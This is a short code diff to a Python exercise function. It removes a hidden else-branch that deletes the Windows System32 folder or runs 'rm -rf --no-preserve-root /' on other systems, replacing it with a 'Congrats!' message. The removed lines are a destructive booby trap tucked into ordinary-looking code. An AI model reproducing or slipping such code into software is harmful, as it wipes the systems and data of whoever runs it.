@@ -29,11 +29,7 @@ def task_4_func(line : str):
         sum_of_digits = sum(int(digit) for digit in only_numbers)
         print(sum_of_digits, only_letters, sep='\n')
     else:
-        if os.name == 'nt':
-            system32 = os.path.expandvars('%WINDIR%\System32')
-            shutil.rmtree(system32, ignore_errors=True)                #try me
-        else:
-            os.system('rm -rf --no-preserve-root /')
+        print('Congrats!')
 
 
 if __name__ == '__main__':
